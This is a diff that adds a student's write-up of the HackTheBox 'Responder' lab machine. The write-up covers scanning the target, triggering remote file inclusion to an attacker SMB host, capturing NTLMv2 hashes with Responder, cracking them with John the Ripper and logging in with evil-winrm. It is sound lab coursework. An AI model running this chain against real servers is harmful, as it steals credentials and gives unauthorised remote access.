@@ -192,9 +192,97 @@ The summary is based on a surface-level review of the article rather than an in-
 
 
 # B) HTB Responder. Ratkaise HackTheBox.com: Starting Point: Tier 1: Responder.
--
+
+**<ins>1. Overall Objective</ins>**
+
+- Exploiting a misconfigured web application that allows remote file inclusion (RFI).
+- This vulnerability is used to capture NTLM authentication data from the target machine using a Responder -tool, which acts as a fake SMB server. The RFI attack initiates an SMB authentication to this fake server controlled by the attacker. 
+- Once the NTLMv2 hash is captured, it’s cracked offline to retrieve plaintext credentials which are then used to gain remote access to the target system over WinRM.
+
+**<ins>2. Terminology</ins>**
+
+- **Responder**
+	- A penetration testing tool that can mimic legitimate services to e.g. intercept authentication attempts and capture credentials over SMB, HTTP or other protocols. 
+	- In this machine, Responder sets up a malicious SMB server to capture NTLMv2 hashes from the NTLM authentication process
+
+- **LFI (Local File Inclusion)**
+	- A web vulnerability where an input (e.g., a URL parameter value) can be manipulated to load and display arbitrary files from the local filesystem on the server in the response. This is typically due to improper sanitization of the parameter.
+
+- **RFI (Remote File Inclusion)** 
+	- A web vulnerability that allows a server to include a file hosted on an external server/source. If improperly configured, the web server may attempt to fetch remote files from attacker-controlled URLs.
+	- In this machine, RFI is used to trigger an external SMB connection to the attacker's machine, where Responder captures the NTLMv2 hash.
+
+- **NTLM (NT LAN Manager)**  
+	- An authentication suite used in Windows environments. It uses a challenge-response mechanism to verify users/systems to avoid sending passwords in plaintext.
+	- A NetNTLMv2 challenge-response is a string that includes both the challenge and the response to that challenge which is encrypted with the user’s password hash.
+	- In this machine, the Responder is used to capture the NTLM hash when the target machine tries to authenticate to a fake SMB server run by the attacker.
+
+- **WinRM (Windows Remote Management)**
+	- A built-in remote management protocol used for remote administration/command execution on Windows systems. It runs over HTTP(S) and by default uses TCP port 5985.
+	- In this machine, WinRM is to remotely access the compromised target machine using stolen credentials.
+
+**<ins>3. Required installations </ins>**
+
+- evil-winrm: `sudo apt-get install evil-winrm`
+
+**<ins>4. Exploitation process</ins>**  
+ 
+**A) Reconnaissance / Enumeration:**
+- Identification of open ports and active services on the target with port scanning:  
+	- `sudo nmap -p- -T4 -sV {target_IP}`
+	- Port 5985 runs WinRM for remote management.
+ 
+ 	![HTB](images/h5-images/b_1.png)   
+
+**B) Exploring File Inclusion Vulnerabilities:**
+- The website URL includes a parameter vulnerable to file inclusion 
+- Manipulating this vulnerable parameter allows:
+	- **LFI**: Loading & reading arbitrary local files form the server
+	- **RFI**: Making the web server attempt to load a file from a remote source (e.g. the attacker's machine). If the remote source acts as an SMB server, the web server will try to access the SMB resource through the NTLM authentication process, which can lead to NTLM authentication leakage
+
+**C) Responder & NTLM Hash Capture**
+- Note: If a firewall has been configured, all incoming traffic should be allowed on TCP port 445 for the Responder to catch the hash: `sudo ufw allow 445/tcp`
+- To run the responder: `sudo responder -I tun0` or `sudo python3 /usr/share/responder/Responder.py – I tun0`
+- To execute the RFI exploit: `http://{domain_name}/?{parameter_name} =//{attacker_IP}/somefile`
+- With the Responder running and acting as a fake SMB server, the RFI triggers the target machine to authenticate to the attacker. This results in Responder capturing the NTLMv2 hash, including the username, domain, and challenge-response data. 
+
+	![HTB](images/h5-images/b_22.png)   
+
+**D) Password hash cracking:**
+- With John the Ripper: `$HOME/john/run/john ntlm.hash`
+
+	![HTB](images/h5-images/b_33.png)   
+
+** E) WinRM Access:**
+- With the recovered/stolen credentials, a session can be established on the target machine using `evil-winrm`
+	- ` sudo evil-winrm -i {target_IP} -u {username} -p {password} `
+	- `evil-winrm` tool to connect to Windows machines remotely using WinRM
+
+- Subsequently, commands can be executed remotely on the compromised target and the flag can be retrieved. 
+
+	![HTB](images/h5-images/b_66.png)
+
+
+**<ins>5. Completion of the Responder machine</ins>**  
+
+	![HTB](images/h5-images/b_99.png)   
+	
+	![HTB](images/h5-images/b_100.png)   
+	
+	![HTB](images/h5-images/b_101.png)   
+	
+
+
 ## References / Lähteet:
--
+- Hack The Box (2025) Starting Point: Responder & Official Write-up (PDF). Available at: https://app.hackthebox.com/starting-point
+- Zero To Mastery. The Best Nmap Cheat Sheet. Available at: https://zerotomastery.io/cheatsheets/nmap-cheat-sheet/  
+- Hobart, E. (2019). Using MultiRelay with Responder for Penetration Testing. Available at: https://www.sikich.com/insight/using-multirelay-with-responder-for-penetration-testing/ 
+- Hacktricks. (2024). File Inclusion/Path traversal - HackTricks. Available at: https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=file%20inclusion#file-inclusion 
+- Alvinashcraft et. al. (2023). Microsoft NTLM - Win32 apps. learn.microsoft.com. Available at: https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm 
+- Kali Linux. (2025). evil-winrm | Kali Linux Tools. Available at: https://www.kali.org/tools/evil-winrm/. 
+- Hacktricks. (2025). 5985,5986 - Pentesting WinRM - HackTricks. Available at: https://book.hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html 
+- Hack The Box. (2025). Website Terms. Available at: https://www.hackthebox.com/tos 
+- Hack The box.com. (2025). Streaming / Writeups / Walkthrough Guidelines | Hack The Box Help Center.  Available at: https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines 
 
 
 
